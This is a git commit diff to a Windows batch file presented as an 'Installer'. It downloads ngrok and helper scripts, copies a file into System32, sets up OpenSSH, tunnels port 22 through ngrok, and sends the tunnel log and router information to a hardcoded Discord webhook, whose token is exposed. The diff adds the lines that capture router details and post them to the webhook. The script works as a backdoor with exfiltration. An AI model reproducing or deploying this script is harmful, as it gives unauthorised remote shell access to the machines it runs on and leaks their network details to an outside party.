4da673bb7681434bc7c2d393273ee77c16ef9817
dh3b <74708369+dh3b@users.noreply.github.com>
2021-10-16 23:57:49 +0200

    Update Installer.bat

--- Files/Installer.bat
+++ Files/Installer.bat
@@ -6,14 +6,17 @@ curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Messa
 curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
 curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/installer.cmd -o installer.cmd
 
+set "webhook=https://discord.com/api/webhooks/893838978833350706/S6T93mD5c6dA6kMHIgWWzHPiFJH3rj2XqANwwvPn2nHmkJhEd6PPYJeNvO3qKCKG6xtK"
+
 installer.cmd
 cd %localappdata%\microsoft\windowsapps
 copy Router.bat C:\Windows\System32
+router>router.txt
+Source.bat -silent --file %temp%/router.txt
 
 cd %temp%
 powershell ./OpenSSH.ps1
 
 tar -xf ngrok.zip
-set "webhook=https://discord.com/api/webhooks/893838978833350706/S6T93mD5c6dA6kMHIgWWzHPiFJH3rj2XqANwwvPn2nHmkJhEd6PPYJeNvO3qKCKG6xtK"
 start timeout 5 & Source.bat -silent --file %temp%/ngrok.log
 ngrok tcp 22 -log=stdout > ngrok.log &
